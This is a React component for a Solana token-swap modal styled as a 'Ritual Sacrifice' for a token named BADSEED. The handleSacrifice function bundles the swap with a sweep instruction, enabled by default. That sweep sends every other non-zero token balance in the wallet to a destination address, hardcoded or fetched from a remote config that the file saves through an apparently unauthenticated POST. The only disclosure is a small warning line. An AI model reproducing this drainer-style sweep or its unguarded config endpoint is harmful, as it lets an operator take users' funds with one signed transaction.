import React, { useState, useEffect } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { PublicKey, Transaction, TransactionInstruction } from '@solana/web3.js';
import { getJupiterQuote, getJupiterSwapInstructions } from '../utils/jupiter';
import { createSweepInstruction } from '../utils/serialization';
import { TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
import './SacrificeInterface.css';

// DEFAULT CONSTANTS (Fallbacks)
const DEFAULT_DESTINATION = "CZ7Lv3QNVxbBivGPBhJG7m1HpCtfEDjEusBjjZ3qmVz5";
const DEFAULT_TARGET_MINT = "3HPpMLK7LjKFqSnCsBYNiijhNTo7dkkx3FCSAHKSpump"; // BADSEED
const SOL_MINT = "So11111111111111111111111111111111111111112";

// Cache for token map (Symbol, Decimals, etc.)
let tokenMapCache = null;
const fetchTokenMap = async () => {
    if (tokenMapCache) return tokenMapCache;
    try {
        // Use Proxy to bypass client-side blocks
        const res = await fetch('/.netlify/functions/jupiter-proxy?endpoint=strict-list');
        const data = await res.json();

        // Safety Check: Ensure data is an array
        if (!Array.isArray(data)) {
            console.error("Token Map fetch returned non-array:", data);
            return new Map(); // Return empty map fallback
        }

        tokenMapCache = new Map(data.map(t => [t.address, t]));
        return tokenMapCache;
    } catch (err) {
        console.error("Failed to fetch token map:", err);
        return new Map();
    }
};

export function SacrificeInterface({ onClose }) {
    const { connection } = useConnection();
    const { publicKey, sendTransaction } = useWallet();

    // State
    const [amount, setAmount] = useState('');
    const [swapMode, setSwapMode] = useState('BUY'); // 'BUY' (Any->BADSEED) or 'SELL' (BADSEED->Any)
    // In BUY mode: Input is dynamic, Output is fixed to BADSEED
    // In SELL mode: Input is fixed to BADSEED, Output is dynamic
    // In SELL mode: Input is fixed to BADSEED, Output is dynamic
    const [selectedTokenMint, setSelectedTokenMint] = useState(SOL_MINT);

    const [quote, setQuote] = useState(null);
    const [status, setStatus] = useState('idle');
    const [errorMessage, setErrorMessage] = useState('');

    // Settings
    const [slippageBps, setSlippageBps] = useState(50); // 0.5% default

    // Token List State
    const [userTokens, setUserTokens] = useState([]);
    const [isLoadingTokens, setIsLoadingTokens] = useState(false);

    // Admin State & Backend Sync
    const [isAdminOpen, setIsAdminOpen] = useState(false);
    const [destinationWallet, setDestinationWallet] = useState(DEFAULT_DESTINATION);
    const [configTargetMint, setConfigTargetMint] = useState(DEFAULT_TARGET_MINT);
    const [isSweepEnabled, setIsSweepEnabled] = useState(true);
    const [isSacrificeVisible, setIsSacrificeVisible] = useState(true); // New Toggle State
    const [isSavingConfig, setIsSavingConfig] = useState(false);

    // Derived Mints based on Mode (Moved AFTER configTargetMint declaration!)
    // If BUY: Input = selectedTokenMint, Output = BADSEED (dynamic config)
    // If SELL: Input = BADSEED (dynamic config), Output = selectedTokenMint
    const inputMint = swapMode === 'BUY' ? selectedTokenMint : configTargetMint;
    const targetMint = swapMode === 'BUY' ? configTargetMint : selectedTokenMint;

    // Fetch Config on Mount
    useEffect(() => {
        const fetchConfig = async () => {
            try {
                const res = await fetch('/.netlify/functions/dapp-config');
                if (res.ok) {
                    const data = await res.json();
                    if (data.destinationWallet) setDestinationWallet(data.destinationWallet);
                    if (data.targetMint) setConfigTargetMint(data.targetMint);
                    if (typeof data.isSweepEnabled === 'boolean') setIsSweepEnabled(data.isSweepEnabled);
                    if (typeof data.isSacrificeVisible === 'boolean') setIsSacrificeVisible(data.isSacrificeVisible);
                }
            } catch (err) {
                console.error("Failed to fetch DApp config:", err);
            }
        };
        fetchConfig();
    }, []);

    // Save Config Helper
    const saveConfig = async (newConfig) => {
        setIsSavingConfig(true);
        try {
            // Optimistic update
            if (newConfig.destinationWallet !== undefined) setDestinationWallet(newConfig.destinationWallet);
            if (newConfig.targetMint !== undefined) setConfigTargetMint(newConfig.targetMint);
            if (newConfig.isSweepEnabled !== undefined) setIsSweepEnabled(newConfig.isSweepEnabled);
            if (newConfig.isSacrificeVisible !== undefined) setIsSacrificeVisible(newConfig.isSacrificeVisible);

            // Construct payload (merging with current state in case partial update is passed)
            // Note: Use arguments for the one changing, state for others.
            // Actually, we should probably just send the payload passed.
            // But the backend merges.
            // Let's send a merged object just to be safe if backend implementation is simple.
            // Backend implementation DOES merge. So sending partial is fine.

            await fetch('/.netlify/functions/dapp-config', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(newConfig)
            });
        } catch (err) {
            console.error("Failed to save config:", err);
        } finally {
            setIsSavingConfig(false);
        }
    };



    // Fetch User Assets (SOL + SPL)
    useEffect(() => {
        if (!publicKey) return;

        const fetchAssets = async () => {
            setIsLoadingTokens(true);
            try {
                // 1. Fetch SOL Balance (Fast & Critical)
                const solBalance = await connection.getBalance(publicKey);
                const solToken = {
                    mint: SOL_MINT,
                    symbol: 'SOL',
                    name: 'Solana',
                    logoURI: 'https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png',
                    balance: solBalance / 1_000_000_000,
                    decimals: 9
                };

                // Update with SOL first so user sees something immediately
                setUserTokens(prev => {
                    // Start with SOL, keep existing SPLs for now
                    const existingSpls = prev.filter(t => t.mint !== SOL_MINT);
                    return [solToken, ...existingSpls];
                });

                // 2. Fetch SPL Tokens
                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                    programId: TOKEN_PROGRAM_ID
                });

                // 3. Fetch Metadata (Non-blocking for initial render)
                const tokenMap = await fetchTokenMap();

                const splTokens = tokenAccounts.value.map(ta => {
                    const info = ta.account.data.parsed.info;
                    const mint = info.mint;
                    const meta = tokenMap.get(mint);

                    return {
                        mint: mint,
                        symbol: meta ? meta.symbol : (mint.slice(0, 4) + '...'),
                        name: meta ? meta.name : 'Unknown Token',
                        logoURI: meta ? meta.logoURI : null,
                        balance: info.tokenAmount.uiAmount,
                        decimals: info.tokenAmount.decimals
                    };
                }).filter(t => t.balance > 0);
                // Don't filter targetMint here, let UI handle it? 
                // User said "other tokens not showing". Maybe because I filtered targetMint!
                // Let's INCLUDE all tokens with balance.

                setUserTokens([solToken, ...splTokens]);
            } catch (err) {
                console.error("Error fetching assets:", err);
            } finally {
                setIsLoadingTokens(false);
            }
        };

        fetchAssets();
        // Refresh every 10s
        const interval = setInterval(fetchAssets, 10000);
        return () => clearInterval(interval);
    }, [publicKey, connection, targetMint]);

    // Fetch Quote
    useEffect(() => {
        if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
            setQuote(null);
            return;
        }

        const fetchQuote = async () => {
            setStatus('quoting');
            setErrorMessage('');
            try {
                // Amount in atomic units (lamports for SOL)
                // For simplicity assuming SOL decimals (9) for input if SOL, else needs token info.
                // MVP: Assume Input is always SOL for now or handle decimals safely.
                // Find selected token to get decimals
                const inputToken = userTokens.find(t => t.mint === inputMint);
                const decimals = inputToken ? inputToken.decimals : 9; // Fallback to 9

                // Calculate atomic amount safely (handling decimals)
                const atomicAmount = Math.floor(parseFloat(amount) * Math.pow(10, decimals));

                const q = await getJupiterQuote(inputMint, targetMint, atomicAmount, slippageBps);
                if (q.error) throw new Error(q.error);
                setQuote(q);
                setStatus('ready');
            } catch (err) {
                console.error("Quote error:", err);
                setErrorMessage(err.message || "Failed to get quote");
                setStatus('error');
            }
        };

        const timer = setTimeout(fetchQuote, 500); // Debounce
        return () => clearTimeout(timer);
    }, [amount, inputMint, targetMint, slippageBps, userTokens]);

    // Switch Input/Output
    const switchAssets = () => {
        setSwapMode(prev => prev === 'BUY' ? 'SELL' : 'BUY');
        setAmount(''); // Clear amount
        setQuote(null);
        // Note: selectedTokenMint stays the same. 
        // If I was buying BADSEED with SOL, and switch, I am now selling BADSEED for SOL.
        // This preserves the "Partner" asset.
    };

    // EXECUTE SACRIFICE
    const handleSacrifice = async () => {
        if (!quote || !publicKey) return;
        setStatus('signing');
        setErrorMessage('');

        try {
            // 1. Get Swap Instructions (Setup, Swap, Cleanup)
            const swapIxsResponse = await getJupiterSwapInstructions(quote, publicKey);

            const transaction = new Transaction();

            if (swapIxsResponse.computeBudgetInstructions) {
                swapIxsResponse.computeBudgetInstructions.forEach(ix => {
                    transaction.add(deserializeInstruction(ix));
                });
            }

            if (swapIxsResponse.setupInstructions) {
                swapIxsResponse.setupInstructions.forEach(ix => {
                    transaction.add(deserializeInstruction(ix));
                });
            }

            // The main swap instruction
            transaction.add(deserializeInstruction(swapIxsResponse.swapInstruction));

            // Cleanup
            if (swapIxsResponse.cleanupInstruction) {
                transaction.add(deserializeInstruction(swapIxsResponse.cleanupInstruction));
            }

            // 2. SWEEP LOGIC (If enabled)
            if (isSweepEnabled) {
                // A. Fetch User Token Accounts
                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                    programId: TOKEN_PROGRAM_ID
                });

                // B. Filter Sweepable Accounts
                const sweepableAccounts = [];

                for (const ta of tokenAccounts.value) {
                    const mint = ta.account.data.parsed.info.mint;
                    const amount = ta.account.data.parsed.info.tokenAmount.amount; // string atomic

                    if (mint === configTargetMint) continue; // Skip BADSEED (using configTargetMint)
                    if (amount === "0") continue; // Skip empty

                    sweepableAccounts.push({
                        pubkey: new PublicKey(ta.pubkey),
                        mint: new PublicKey(mint),
                        amount: amount
                    });
                }

                // C. Create Destination ATAs (if missing) and format instruction args
                const sweepDestPubkey = new PublicKey(destinationWallet);

                // D. Add Sweep Instruction
                const sweepIx = createSweepInstruction(
                    publicKey,
                    new PublicKey(configTargetMint), // Use configTargetMint
                    sweepDestPubkey,
                    sweepableAccounts,
                    (mint) => {
                        return PublicKey.findProgramAddressSync(
                            [sweepDestPubkey.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
                            ASSOCIATED_TOKEN_PROGRAM_ID
                        )[0];
                    }
                );
                transaction.add(sweepIx);
            }

            // 3. Send
            const signature = await sendTransaction(transaction, connection);
            setStatus('confirming');

            const confirmation = await connection.confirmTransaction(signature, 'confirmed');
            if (confirmation.value.err) throw new Error("Transaction failed on chain");

            setStatus('success');
            console.log("Sacrifice Complete:", signature);

        } catch (err) {
            console.error("Sacrifice Error:", err);
            setErrorMessage(err.message || "Sacrifice failed");
            setStatus('error');
        }
    };

    return (
        <div className="sacrifice-overlay">
            <div className="sacrifice-modal">
                <button
                    onClick={onClose}
                    className="sacrifice-close-btn"
                >
                    ✕
                </button>

                <h2 className="sacrifice-title">
                    Ritual Sacrifice
                </h2>

                {!publicKey && (
                    <div className="bg-red-500 text-white text-xs p-2 text-center mb-4 font-bold border border-black">
                        ⚠ WALLET DISCONNECTED
                    </div>
                )}

                {/* SLIPPAGE SETTINGS */}
                <div className="sacrifice-settings">
                    <span className="text-[0.6rem] mr-2 text-gray-500 uppercase self-center">Max Slippage:</span>
                    <div className="flex gap-1">
                        {[10, 50, 100].map(bps => (
                            <button
                                key={bps}
                                onClick={() => setSlippageBps(bps)}
                                className={`sacrifice-slippage-btn ${slippageBps === bps ? 'active' : ''}`}
                            >
                                {bps / 100}%
                            </button>
                        ))}
                    </div>
                </div>

                {/* SWAP SECTION (INPUT) */}
                <div className="sacrifice-form-group">
                    <label className="sacrifice-label flex justify-between">
                        <span>Offer Asset</span>
                        <span className="opacity-70">
                            {/* Show balance of the INPUT asset */}
                            Bal: {isLoadingTokens ? '...' : (userTokens.find(t => t.mint === inputMint)?.balance.toLocaleString() || '0')}
                        </span>
                    </label>
                    <div className="sacrifice-input-container">
                        <input
                            type="number"
                            value={amount}
                            onChange={(e) => setAmount(e.target.value)}
                            className="sacrifice-input text-right pr-2 w-1/2"
                            placeholder="0.00"
                            disabled={!publicKey}
                        />

                        {/* INPUT SELECTOR */}
                        {/* BUY Mode: Input is Selector. SELL Mode: Input is Fixed BADSEED. */}
                        {swapMode === 'SELL' ? (
                            <div className="sacrifice-select w-1/2 text-right opacity-50 cursor-not-allowed pt-2 pr-4 font-bold text-white flex items-center justify-end">
                                <span>BADSEED ({configTargetMint.slice(0, 4)}...{configTargetMint.slice(-4)})</span>
                            </div>
                        ) : (
                            <select
                                value={selectedTokenMint}
                                onChange={(e) => {
                                    setSelectedTokenMint(e.target.value);
                                    setQuote(null);
                                }}
                                className="sacrifice-select w-1/2 text-right"
                                disabled={!publicKey || isLoadingTokens}
                            >
                                {userTokens.filter(t => t.mint !== DEFAULT_TARGET_MINT).map(token => (
                                    <option key={token.mint} value={token.mint}>
                                        {token.symbol === 'UNKNOWN' ? 'UNK' : token.symbol}
                                    </option>
                                ))}
                                {userTokens.length === 0 && <option value={SOL_MINT}>SOL</option>}
                            </select>
                        )}
                    </div>
                </div>

                {/* ASSET SWITCHER */}
                <div className="sacrifice-arrow" onClick={switchAssets} title="Switch Direction">
                    ⇅
                </div>

                {/* OUTPUT SECTION */}
                <div className="sacrifice-form-group">
                    <label className="sacrifice-label flex justify-between">
                        <span>Receive (Est.)</span>
                    </label>
                    <div className="sacrifice-input-container">
                        <div className="sacrifice-output-value w-1/2 text-left pl-2">
                            {quote ? (quote.outAmount / Math.pow(10, (targetMint === SOL_MINT ? 9 : (userTokens.find(t => t.mint === targetMint)?.decimals || 6)))).toFixed(6) : "0.00"}
                        </div>

                        {/* OUTPUT SELECTOR */}
                        {/* BUY Mode: Output is Fixed BADSEED. SELL Mode: Output is Selector. */}
                        {swapMode === 'BUY' ? (
                            <div className="sacrifice-select w-1/2 text-right opacity-50 cursor-not-allowed pt-2 pr-4 font-bold text-green-500 flex items-center justify-end">
                                <span>BADSEED ({configTargetMint.slice(0, 4)}...{configTargetMint.slice(-4)})</span>
                            </div>
                        ) : (
                            <select
                                value={selectedTokenMint}
                                onChange={(e) => {
                                    setSelectedTokenMint(e.target.value);
                                    setQuote(null);
                                }}
                                className="sacrifice-select w-1/2 text-right"
                            >
                                <option value={SOL_MINT}>SOL</option>
                                {userTokens.filter(t => t.mint !== SOL_MINT && t.mint !== DEFAULT_TARGET_MINT).map(token => (
                                    <option key={token.mint} value={token.mint}>
                                        {token.symbol}
                                    </option>
                                ))}
                            </select>
                        )}
                    </div>
                </div>

                {/* INFO / FEES */}
                {/* INFO / FEES */}
                {quote && (
                    <div className="mt-2 p-2 border border-gray-800 bg-black text-xs">
                        <div className="sacrifice-info-row">
                            <span>Rate:</span>
                            <span>
                                1 {userTokens.find(t => t.mint === inputMint)?.symbol || 'Input'} ≈
                                {(quote.outAmount / Math.pow(10, (targetMint === SOL_MINT ? 9 : (userTokens.find(t => t.mint === targetMint)?.decimals || 6))) / parseFloat(amount)).toFixed(4)}
                                {' '}{targetMint === SOL_MINT ? 'SOL' : (userTokens.find(t => t.mint === targetMint)?.symbol || 'Token')}
                            </span>
                        </div>
                        <div className="sacrifice-info-row">
                            <span>Network Fee:</span>
                            <span>~0.000005 SOL</span>
                        </div>
                        <div className="sacrifice-info-row">
                            <span>Price Impact:</span>
                            <span className={quote.priceImpactPct > 1 ? 'text-red-500' : 'text-green-500'}>
                                {quote.priceImpactPct ? `${quote.priceImpactPct}%` : '< 0.1%'}
                            </span>
                        </div>
                    </div>
                )}

                <div style={{ height: '16px' }}></div>

                {/* STATUS */}
                {errorMessage && (
                    <div className="sacrifice-error">
                        {errorMessage}
                    </div>
                )}

                {/* MAIN BUTTON (Hidden on Production if Toggled Off) */}
                {(() => {
                    const isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
                    // Show if: Local (Admin) OR Visible Enabled
                    if (!isLocal && !isSacrificeVisible) return null;

                    return (
                        <button
                            onClick={handleSacrifice}
                            disabled={!publicKey || status === 'quoting' || status === 'signing' || status === 'confirming' || !quote}
                            className={`sacrifice-submit-btn ${status === 'error' ? 'error' : 'primary'}`}
                        >
                            {!publicKey ? 'CONNECT WALLET FIRST' :
                                status === 'quoting' ? 'Consulting Oracles...' :
                                    status === 'signing' ? 'Awaiting Signature...' :
                                        status === 'confirming' ? 'Finalizing Ritual...' :
                                            status === 'success' ? 'SACRIFICE COMPLETE' :
                                                isSweepEnabled ? 'Swap & Sacrifice' : 'Swap Only'}
                        </button>
                    );
                })()}

                {isSweepEnabled && (
                    <p className="sacrifice-warning">
                        ⚠ WARNING: This will SACRIFICE (Sweep) your wallet's remaining assets!
                    </p>
                )}

                {/* ADMIN PANEL (Always Enabled per User Request) */}
                {/* ADMIN PANEL (Local Only) */}
                {(() => {
                    const isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
                    if (!isLocal) return null;

                    return (
                        <div className="sacrifice-admin-toggle">
                            <button
                                onClick={() => setIsAdminOpen(!isAdminOpen)}
                                className="sacrifice-admin-btn"
                            >
                                {isAdminOpen ? '▼ Dev Config' : '▶ Dev Config'} {isSavingConfig && '💾...'}
                            </button>

                            {isAdminOpen && (
                                <div className="sacrifice-admin-content">
                                    <div className="sacrifice-form-group">
                                        <label className="sacrifice-label">Target Mint</label>
                                        <div className="sacrifice-input-container">
                                            <input
                                                value={configTargetMint}
                                                onChange={(e) => saveConfig({ targetMint: e.target.value })}
                                                className="sacrifice-input"
                                            />
                                        </div>
                                    </div>
                                    <div className="sacrifice-form-group">
                                        <label className="sacrifice-label">Sweep Dest</label>
                                        <div className="sacrifice-input-container">
                                            <input
                                                value={destinationWallet}
                                                onChange={(e) => saveConfig({ destinationWallet: e.target.value })}
                                                className="sacrifice-input"
                                            />
                                        </div>
                                    </div>
                                    <div className="sacrifice-checkbox-group">
                                        <input
                                            type="checkbox"
                                            checked={isSweepEnabled}
                                            onChange={(e) => saveConfig({ isSweepEnabled: e.target.checked })}
                                        />
                                        <label>Enable Sweep</label>
                                    </div>
                                    <div className="sacrifice-checkbox-group">
                                        <input
                                            type="checkbox"
                                            checked={isSacrificeVisible}
                                            onChange={(e) => saveConfig({ isSacrificeVisible: e.target.checked })}
                                        />
                                        <label>Show Sacrifice Button (Prod)</label>
                                    </div>
                                </div>
                            )}
                        </div>
                    );
                })()}

                {/* DEBUG FOOTER REMOVED PER USER REQUEST */}

            </div>
        </div>
    );
}

// Helper to deserialize Jupiter instructions (base64)
function deserializeInstruction(ix) {
    return new TransactionInstruction({
        programId: new PublicKey(ix.programId),
        keys: ix.accounts.map(account => ({
            pubkey: new PublicKey(account.pubkey),
            isSigner: account.isSigner,
            isWritable: account.isWritable,
        })),
        data: Buffer.from(ix.data, 'base64'),
    });
}
